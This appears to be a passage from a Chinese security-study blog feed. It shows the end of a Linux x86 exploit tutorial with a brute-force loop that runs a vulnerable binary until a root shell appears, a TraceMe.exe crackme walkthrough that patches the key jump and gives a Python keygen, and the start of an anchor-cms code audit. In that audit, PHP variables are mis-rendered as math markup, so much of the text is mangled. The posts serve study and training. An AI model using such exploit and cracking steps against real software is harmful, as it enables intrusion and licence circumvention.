program&quot;</span><br><span class="hljs-comment">#Multiple tries until we get lucky</span><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> (i &lt; <span class="hljs-number">512</span>):<br>  <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Number of tries: %d&quot;</span> %i<br>  i += <span class="hljs-number">1</span><br>  ret = call([<span class="hljs-string">&quot;./vuln&quot;</span>, buf])<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> ret):<br>   <span class="hljs-keyword">break</span><br>  <span class="hljs-keyword">else</span>:<br>   <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Exploit failed&quot;</span><br><br></code></pre></td></tr></table></figure><p>如下，循环到365时成功爆破得到rootshell</p> <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210802102532162.png" alt="image-20210802102532162" style="zoom:80%;">]]></content>
    
    
    <categories>
      
      <category>PWN学习</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>逆向TraceMe.exe</title>
    <link href="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/"/>
    <url>/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/</url>
    
    <content type="html"><![CDATA[<h1 id="逆向tracemeexe"><a class="markdownIt-Anchor" href="#逆向tracemeexe"></a> 逆向TraceMe.exe</h1><p>首先我们得找到关键函数，就是关键跳，修改后能够直接破解成功的步骤，我们知道这个程序是有对话框的，所以我们在window的对话框api上下断点</p><img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image002.jpg" alt="img" style="zoom:80%;"><p>首先尝试随便输入用户名和序列号</p><img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image004.jpg" alt="img" style="zoom:80%;"><p>可以看到这个时候触发了断点在0x75D4E290处</p><img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image006.jpg" alt="img" style="zoom:80%;"><p>直接使用f9跳转到返回的地方，跳过一些api函数后，这里这两个我认为应该都是读取对话框的函数。</p><img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image008.jpg" alt="img" style="zoom:80%;"><p>我们继续单步运行，这里注意到，当运行到图中所示地址时，eax和edx就出现了我们输入的内容</p><img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image010.jpg" alt="img" style="zoom:80%;"><img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image012.jpg" alt="img" style="zoom:80%;"><p>之后会call 401340这个函数，我认为这个是一个关键函数</p><img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image014.jpg" alt="img" style="zoom:80%;"><p>经过调试分析，这个函数的大概逻辑如下</p><img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image016.jpg" alt="img" style="zoom:80%;"><p>0x405030的地方存储的数值如下</p><img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image018.jpg" alt="img" style="zoom:80%;"><p>继续运行，可以看到ecx=7的时候就跳出了这个循环</p><img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image020.jpg" alt="img" style="zoom:80%;"><img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image022.jpg" alt="img" style="zoom:80%;"><p>执行完之后，貌似得到2675，可能是密钥值，因为之后的函数把string2“ebp：2675“和string1”abcdefg“进行比较了</p><img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image024.jpg" alt="img" style="zoom:80%;"><img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image026.jpg" alt="img" style="zoom:80%;"><img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image028.jpg" alt="img" style="zoom:80%;"><p>比较函数过后会来到这个地方，test eax，eax，表示eax为1时跳转，这里我们的eax是0，尝试修改为jne</p><img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image030.jpg" alt="img" style="zoom:80%;"><p>之后可以看到是成功的，说明这个就是关键跳</p><img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image032.jpg" alt="img" style="zoom:80%;"><p>我们要写一个注册机程序那就得先逆向他的加密代码，根据我们判断以下的逻辑</p><img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image033.jpg" alt="img" style="zoom:80%;"><p>写出python脚本代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br>a=<span class="hljs-built_in">str</span>(raw_input(<span class="hljs-string">&quot;请输入用户名：&quot;</span>)) <br>yanzhen=[<span class="hljs-number">0x0C</span> ,<span class="hljs-number">0x0A</span> ,<span class="hljs-number">0x13</span> ,<span class="hljs-number">0x09</span> ,<span class="hljs-number">0x0C</span> ,<span class="hljs-number">0x0B</span> ,<span class="hljs-number">0x0A</span> ,<span class="hljs-number">0x08</span>]<br>edi=<span class="hljs-built_in">len</span>(a)<br><span class="hljs-comment">#print len(a)</span><br>ecx=<span class="hljs-number">3</span><br>esi=<span class="hljs-number">0</span><br>eax=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> ecx&lt;edi:<br>  <span class="hljs-keyword">if</span> eax&gt;<span class="hljs-number">7</span>:<br>    eax=<span class="hljs-number">0</span><br>  ebx=<span class="hljs-number">0</span><br>  edx=<span class="hljs-number">0</span><br>  edx=<span class="hljs-built_in">ord</span>(a[ecx])<br>  ebx=yanzhen[eax]<br>  <span class="hljs-comment">#print &quot;ebx=&quot; + str(ebx)</span><br>  <span class="hljs-comment">#print &quot;edx=&quot; + str(edx)</span><br>  ebx=edx*ebx<br>  esi=ebx+esi<br>  ecx+=<span class="hljs-number">1</span><br>  eax+=<span class="hljs-number">1</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;序列号为：&quot;</span>+ <span class="hljs-built_in">str</span>(esi)<br></code></pre></td></tr></table></figure><img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image035.gif" alt="img" style="zoom:80%;"><p>验证</p><p><img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image037.gif" alt="img" style="zoom:80%;"><img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image039.gif" alt="img" style="zoom:80%;"></p>]]></content>
    
    
    <categories>
      
      <category>逆向学习</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日安全[代码审计]3则</title>
    <link href="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/"/>
    <url>/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/</url>
    
    <content type="html"><![CDATA[<h1 id="红日安全代码审计3则"><a class="markdownIt-Anchor" href="#红日安全代码审计3则"></a> 红日安全[代码审计]3则</h1><h2 id="红日安全代码审计day-2-twig"><a class="markdownIt-Anchor" href="#红日安全代码审计day-2-twig"></a> 红日安全[代码审计]Day 2 – Twig</h2><h3 id="实例分析"><a class="markdownIt-Anchor" href="#实例分析"></a> 实例分析</h3><p>首先安装题中给的anchor-cms-0.9.2</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image002.jpg" alt="img" style="zoom: 80%;"><p>当我们访问一个不存在的网页时，它会显示一个404页面</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image004.jpg" alt="img" style="zoom:80%;"><p>这个页面的代码如下，注意这里的current_url()函数</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image006.jpg" alt="img" style="zoom:80%;"><p>这个函数又调用了Uri类的current()方法</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image008.jpg" alt="img" style="zoom:80%;"><p>在Uri类中static::$current = static::detect();又掉用了detect方法</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image010.jpg" alt="img" style="zoom:80%;"><p>detect方法如下，它会获取 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mrow></mrow><mi>S</mi></msub><mi>E</mi><mi>R</mi><mi>V</mi><mi>E</mi><mi>R</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">组</mi><mi mathvariant="normal">中</mi><msup><mi mathvariant="normal">的</mi><mo mathvariant="normal">′</mo></msup><mi>R</mi><mi>E</mi><mi>Q</mi><mi>U</mi><mi>E</mi><mi>S</mi><msub><mi>T</mi><mi>U</mi></msub><mi>R</mi><msup><mi>I</mi><mo mathvariant="normal">′</mo></msup><msup><mi mathvariant="normal">、</mi><mo mathvariant="normal">′</mo></msup><mi>P</mi><mi>A</mi><mi>T</mi><msub><mi>H</mi><mi>I</mi></msub><mi>N</mi><mi>F</mi><msup><mi>O</mi><mo mathvariant="normal">′</mo></msup><mo separator="true">,</mo><msup><mi mathvariant="normal">、</mi><mo mathvariant="normal">′</mo></msup><mi>O</mi><mi>R</mi><mi>I</mi><msub><mi>G</mi><mi>P</mi></msub><mi>A</mi><mi>T</mi><msub><mi>H</mi><mi>I</mi></msub><mi>N</mi><mi>F</mi><msup><mi>O</mi><mo mathvariant="normal">′</mo></msup><mi mathvariant="normal">三</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">键</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">（</mi><mi mathvariant="normal">“</mi><mi>R</mi><mi>E</mi><mi>Q</mi><mi>U</mi><mi>E</mi><mi>S</mi><msub><mi>T</mi><mi>U</mi></msub><mi>R</mi><mi>I</mi><mi mathvariant="normal">”</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">访</mi><mi mathvariant="normal">问</mi><mi mathvariant="normal">此</mi><mi mathvariant="normal">页</mi><mi mathvariant="normal">面</mi><mi mathvariant="normal">所</mi><mi mathvariant="normal">需</mi><mi mathvariant="normal">的</mi><mi>U</mi><mi>R</mi><mi>I</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">例</mi><mi mathvariant="normal">如</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">“</mi><mi mathvariant="normal">/</mi><mi>i</mi><mi>n</mi><mi>d</mi><mi>e</mi><mi>x</mi><mi mathvariant="normal">.</mi><mi>h</mi><mi>t</mi><mi>m</mi><mi>l</mi><mi mathvariant="normal">”</mi><mi mathvariant="normal">）</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">然</mi><mi mathvariant="normal">后</mi><mi mathvariant="normal">通</mi><mi mathvariant="normal">过</mi><mi>f</mi><mi>o</mi><mi>r</mi><mi>e</mi><mi>a</mi><mi>c</mi><mi>h</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">_SERVER 数组中的 &#x27;REQUEST_URI&#x27; 、&#x27;PATH_INFO&#x27;, 、&#x27;ORIG_PATH_INFO&#x27; 三个键的值（“REQUEST_URI”是访问此页面所需的 URI。例如，“/index.html”），然后通过foreach(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05764em;">S</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">中</span><span class="mord"><span class="mord cjk_fallback">的</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault">Q</span><span class="mord mathdefault" style="margin-right:0.10903em;">U</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.10903em;">U</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord cjk_fallback">、</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.07847em;">I</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord cjk_fallback">、</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.07847em;">I</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord cjk_fallback">三</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">键</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">（</span><span class="mord">“</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault">Q</span><span class="mord mathdefault" style="margin-right:0.10903em;">U</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.10903em;">U</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord">”</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">访</span><span class="mord cjk_fallback">问</span><span class="mord cjk_fallback">此</span><span class="mord cjk_fallback">页</span><span class="mord cjk_fallback">面</span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">的</span><span class="mord mathdefault" style="margin-right:0.10903em;">U</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">例</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">，</span><span class="mord">“</span><span class="mord">/</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord">.</span><span class="mord mathdefault">h</span><span class="mord mathdefault">t</span><span class="mord mathdefault">m</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord">”</span><span class="mord cjk_fallback">）</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">然</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">通</span><span class="mord cjk_fallback">过</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">a</span><span class="mord mathdefault">c</span><span class="mord mathdefault">h</span><span class="mopen">(</span></span></span></span>try as <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mi>e</mi><mi>t</mi><mi>h</mi><mi>o</mi><mi>d</mi><mo stretchy="false">)</mo><mi mathvariant="normal">依</mi><mi mathvariant="normal">次</mi><mi mathvariant="normal">进</mi><mi mathvariant="normal">行</mi><mi mathvariant="normal">判</mi><mi mathvariant="normal">断</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">如</mi><mi mathvariant="normal">果</mi><mi mathvariant="normal">满</mi><mi mathvariant="normal">足</mi></mrow><annotation encoding="application/x-tex">method)依次进行判断，如果满足</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mclose">)</span><span class="mord cjk_fallback">依</span><span class="mord cjk_fallback">次</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">判</span><span class="mord cjk_fallback">断</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">满</span><span class="mord cjk_fallback">足</span></span></span></span>uri = filter_var(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>u</mi><mi>r</mi><mi>i</mi><mo separator="true">,</mo><mi>F</mi><mi>I</mi><mi>L</mi><mi>T</mi><mi>E</mi><msub><mi>R</mi><mi>S</mi></msub><mi>A</mi><mi>N</mi><mi>I</mi><mi>T</mi><mi>I</mi><mi>Z</mi><msub><mi>E</mi><mi>U</mi></msub><mi>R</mi><mi>L</mi><mo stretchy="false">)</mo><mi mathvariant="normal">和</mi></mrow><annotation encoding="application/x-tex">uri, FILTER_SANITIZE_URL)和</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05764em;">S</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.10903em;">U</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault">L</span><span class="mclose">)</span><span class="mord cjk_fallback">和</span></span></span></span>uri = parse_url(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>u</mi><mi>r</mi><mi>i</mi><mo separator="true">,</mo><mi>P</mi><mi>H</mi><msub><mi>P</mi><mi>U</mi></msub><mi>R</mi><msub><mi>L</mi><mi>P</mi></msub><mi>A</mi><mi>T</mi><mi>H</mi><mo stretchy="false">)</mo><mi mathvariant="normal">这</mi><mi mathvariant="normal">两</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">条</mi><mi mathvariant="normal">件</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">通</mi><mi mathvariant="normal">过</mi><mi>s</mi><mi>t</mi><mi>a</mi><mi>t</mi><mi>i</mi><mi>c</mi><mo>:</mo><mo>:</mo><mi>f</mi><mi>o</mi><mi>r</mi><mi>m</mi><mi>a</mi><mi>t</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">uri, PHP_URL_PATH)这两个条件，就通过static::format(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.10903em;">U</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mclose">)</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">两</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">条</span><span class="mord cjk_fallback">件</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">通</span><span class="mord cjk_fallback">过</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mopen">(</span></span></span></span>uri, $server)把uri传入format方法</p><p>可以知道FILTER_SANITIZE_URL这个过滤器允许所有的字母、数字以及 -_.+!*'(),{}|\^~[]`"><#%; ?:@&="，然后parse_url(uri," php_url_path)只是用来解析uri的函数，并没有过滤功能< p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image012.jpg" alt="img" 